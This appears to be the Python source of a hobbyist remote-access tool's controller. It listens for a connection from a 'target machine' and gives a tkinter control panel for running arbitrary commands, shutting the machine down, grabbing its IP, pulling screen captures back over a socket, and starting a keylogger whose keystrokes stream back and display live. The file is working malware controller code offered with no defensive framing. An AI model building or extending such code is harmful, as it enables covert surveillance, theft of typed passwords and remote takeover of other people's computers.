import socket
import tkinter
import time
import tkinter.font
import threading
#class for connection
#class for gui (maybe if i get round to it)
class remote_connection:
    def __init__(self) -> None:
        self.socket_server = socket.socket()
        self.socket_server.bind(("192.168.1.141",8017))
        self.socket_server.listen(1)
        connection, address = self.socket_server.accept()
        self.server = connection
        self.vars = self.handshake(["connected"])
        self.pilactive = self.vars[1]
        self.pynputactive = self.vars[2]
        print(self.pilactive)
    def handshake(self,buffer):
        self.server.sendall(b"_")
        self.server.recv(1024)
        send_buffer = buffer
        for i in send_buffer:
            self.server.sendall(i.encode())
            self.server.recv(1024)
        self.server.sendall(b"&end")
        receive_buffer = []
        self.server.recv(1024)
        self.server.sendall(b"_")
        while True:
            recv = self.server.recv(4096)
            if recv == b"&end":
                break
            self.server.sendall(b"_")
            receive_buffer.append(recv.decode())
        return receive_buffer
    def file_transfer_socket(self):#temporary
        temp_socket_server = socket.socket()
        temp_socket_server.bind(("192.168.1.141",8018))
        temp_socket_server.listen(1)
        connection, address = temp_socket_server.accept()
        temp_server = connection
        filename = temp_server.recv(1024).decode()
        temp_server.sendall(b"_")
        with open(filename,"wb") as doc:
            while True:
                content = temp_server.recv(4096)
                if content == b"&end":
                    break
                doc.write(content)
                temp_server.sendall(b"_")
            doc.close()
        print("done copying file over")
        root = tkinter.Tk()
        image = tkinter.PhotoImage(master=root,file="remote screenshot.png")
        displaylabel = tkinter.Label(root,image=image)
        displaylabel.pack()
        root.mainloop()
    def display_inputs(self):
        root = tkinter.Tk()
        text_box = tkinter.Text(root)
        text_box.pack()
        root.update()
        temp_socket_server = socket.socket()
        temp_socket_server.bind(("192.168.1.141",8019))
        temp_socket_server.listen(1)
        connection, address = temp_socket_server.accept()
        temp_server = connection
        while True:
            key = temp_server.recv(1024).decode().strip("'")
            if key != "_":
                match key:
                    case "Key.space":
                        text_box.insert(tkinter.END," ")
                    case "Key.enter":
                        text_box.insert(tkinter.END,"\n")
                    case "Key.backspace":
                        text_box.delete("end-2c",tkinter.END)
                    case _:
                        text_box.insert(tkinter.END,key)
            temp_server.sendall(b"_")
            root.update()
        
class window(remote_connection):
    def __init__(self) -> None:
        super().__init__()
        self.outgoing_buffer = []
        self.root = tkinter.Tk()
        default_font = tkinter.font.nametofont("TkDefaultFont")
        default_font.configure(size=18)
        self.root.title("control pannel")
        
        #terminal interaction box
        self.terminal_frame = tkinter.LabelFrame(self.root,text="terminal",fg="green",bg="grey")
        self.terminal_frame.grid(row=0,column=0,columnspan=1,sticky=tkinter.NSEW)
        self.submit_command_button = tkinter.Button(self.terminal_frame,text="submit command",fg="green",bg="black",command=self.submit_command)
        self.submit_command_button.grid(row=0,column=0,columnspan=1,sticky=tkinter.NSEW)
        self.submit_command_entry = tkinter.Entry(self.terminal_frame,fg="green",bg="black")
        self.submit_command_entry.grid(row=1,column=0,columnspan=1,sticky=tkinter.NSEW)
        
        #status box
        self.status_frame = tkinter.LabelFrame(self.root,text="status",fg="green",bg="grey")
        self.status_frame.grid(row=0,column=1,sticky=tkinter.NSEW)
        self.status_label = tkinter.Label(self.status_frame,text="connected",fg="green",bg="black")
        self.status_label.grid(row=0,column=0,sticky=tkinter.NSEW)
        
        #the stack box (what is happening and the contents of the buffer)
        self.stack_box = tkinter.LabelFrame(self.root,fg="green",bg="grey")
        self.stack_box.grid(row=0,column=2,rowspan=2,columnspan=1)
        self.stack_text = tkinter.Text(self.stack_box,fg="green",bg="black")
        self.stack_text.grid(row=0,column=0,sticky=tkinter.NSEW)
        
        #quick actions pannel
        self.quick_actions_frame = tkinter.LabelFrame(self.root,fg="green",bg="grey",text="quick actions")
        self.quick_actions_frame.grid(row=1,column=0,columnspan=2,sticky=tkinter.NSEW)
        self.shutdown_button = tkinter.Button(self.quick_actions_frame,
                                              fg="green",bg="black",text="shutdown",
                                              command=lambda:self.quick_action(action="shutdown"))
        self.shutdown_button.grid(row=0,column=0,columnspan=1,sticky=tkinter.NSEW)
        self.ip_button = tkinter.Button(self.quick_actions_frame,
                                              fg="green",bg="black",text="get ip",
                                              command=lambda:self.quick_action(action="ip address"))
        self.ip_button.grid(row=0,column=1,columnspan=1,sticky=tkinter.NSEW)
        
        if self.pilactive == "True":
            print("PIL detected on target machine, unlocking screen captures")
            self.screen_capture_button = tkinter.Button(self.quick_actions_frame,
                                                fg="green",bg="black",text="screen capture",
                                                command=lambda:self.quick_action(action="screen capture"))
            self.screen_capture_button.grid(row=1,column=0,columnspan=1,sticky=tkinter.NSEW)
        else:
            print("pil not detected, some features may not work")
        
        if self.pynputactive == "True":
            print("pynput detected, keylogger unlocked")
            self.keylogger_button = tkinter.Button(self.quick_actions_frame,fg="green",bg="black",text="keylogger start",
                                                command=lambda:self.quick_action(action="keylogger start"))
            self.keylogger_button.grid(row=1,column=1,columnspan=1,sticky=tkinter.NSEW)
        else:
            print("pynput not detected, some functionality removed")
        
        #upkeep of the program
        threading.Thread(target=self.mainloop).start()
        self.root.mainloop()
    def mainloop(self):
        while True:
            time.sleep(0.5)
            self.incoming_buffer = self.handshake(self.outgoing_buffer)
            self.outgoing_buffer = []
            for i in self.incoming_buffer:
                self.stack_text.insert(tkinter.END,i+"\n")
                self.stack_text.see("end")
            self.incoming_buffer = []
    def quick_action(self,action):
        print(action)
        self.stack_text.insert(tkinter.END,">>> "+action+"\n")
        self.stack_text.see("end")
        match action:
            case "shutdown":
                self.outgoing_buffer.append("shutdown") 
            case "ip address":
                self.outgoing_buffer.append("ip address")
            case "screen capture":
                self.outgoing_buffer.append("screen capture")
                threading.Thread(target=self.file_transfer_socket).start()
            case "keylogger start":
                self.outgoing_buffer.append("keylogger start")
                threading.Thread(target=self.display_inputs).start()
    def submit_command(self):
        command = self.submit_command_entry.get()
        if command == "":
            return
        self.submit_command_entry.delete(0,tkinter.END)
        print("command issued:",command)
        self.stack_text.insert(tkinter.END,">>> "+command+"\n")
        self.stack_text.see("end")
        self.outgoing_buffer.append("command,"+command)
print("starting ...")
window()